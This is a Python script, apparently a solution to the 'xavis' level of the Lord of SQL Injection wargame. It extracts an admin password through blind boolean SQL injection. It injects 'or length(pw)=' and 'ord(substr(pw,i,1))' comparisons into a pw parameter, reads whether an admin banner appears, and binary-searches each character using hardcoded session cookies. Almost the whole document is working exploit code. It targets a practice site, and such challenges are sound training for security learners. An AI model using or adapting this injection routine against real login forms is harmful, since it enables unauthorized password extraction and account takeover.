#https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php

#regexp # like 막힘
import requests
from bs4 import BeautifulSoup



request_header = {
	"Accept": "*/*",
	'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac Os X 10_9_5) AppleWebKit 537.36 (KHMTL, like Gecko) Chrome',
	'Accept-Language': 'ko-KR,ko;q=0.8,en-US;q=0.6,en;q=0.4'
}
target_url = "https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php"
query = "?pw=1%27or%20length(pw)%20=%20%27{}"
s =  requests.session()
cookies = {"__cfduid":"dea80bf0edb4998f73e2bfa300ad2205c1555395056","PHPSESSID":"5rvtkj1ih2galu0lv8m5md2is7"}

# html = s.get(target_url,headers=request_header,cookies=cookies)
# bs_obj = BeautifulSoup(html.text,'html.parser')
# print(bs_obj.text)
##1. 길이 알아내기##

length = 0

for i in range(31,45):

	html = s.get(target_url+query.format(str(i)),headers=request_header,cookies=cookies)
	bs_obj = BeautifulSoup(html.text,'html.parser')

	if bs_obj.select_one('h2') and 'admin' in bs_obj.select_one('h2').get_text():

		print('find it!')
		length = i
		break

print("length :", length)
##2. 길이 알아내기##

attack_query = "?pw=1%27or%20ord(substr(pw,{},1))%20{}%20%27{}"

word_list = []
#for i in range(1,length+1):
for i in range(1,41):
	print("%d 번째" % i)
	temp = 0
	upper_check = False
	lower_check = False	
	double_check = False
	total = 65535
	arrow = '<'
	temp = total
	for j in range(0,300):

		# print("full query :" , target_url+attack_query.format(i,arrow,str(temp)))
		html = s.get(target_url+attack_query.format(i,arrow,str(temp)),headers=request_header,cookies=cookies)
		bs_obj = BeautifulSoup(html.text,'html.parser')
		print("temp :", temp)
		# print("total :", total)
		if bs_obj.select_one('h2') and 'admin' in bs_obj.select_one('h2').get_text():

#https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw=1%27or%20ord(substr(pw,1,1))%20>%20%27183
			# if arrow != '=' and total<=1:
			# 	arrow =='='				

			if arrow =='<':
				
				temp-=total//2
				upper_check = True
				if lower_check is True:
					total = total//2
					lower_check = False
				# else:
				# 	arrow='>'

			elif arrow == '>':
				
				if (total//2)<1:
					temp+=1
				else:
					temp+=total//2


				lower_check = True
				if upper_check:
					total = total//2
					upper_check = False
					

			elif arrow == '=':
				print('find it!')
				word_list.append(chr(temp))
				break
			
		else:
			
			if arrow == '<':
				lower_check = True
				arrow ='>'
			elif arrow == '>':
				upper_check = True
				arrow ='='
			elif arrow == '=':

				arrow ='<'

			# with open('savefile','w',encoding='utf-8') as f:
			# 	f.write(str(word_list))
			# break

print(word_list)
print(''.join(word_list))
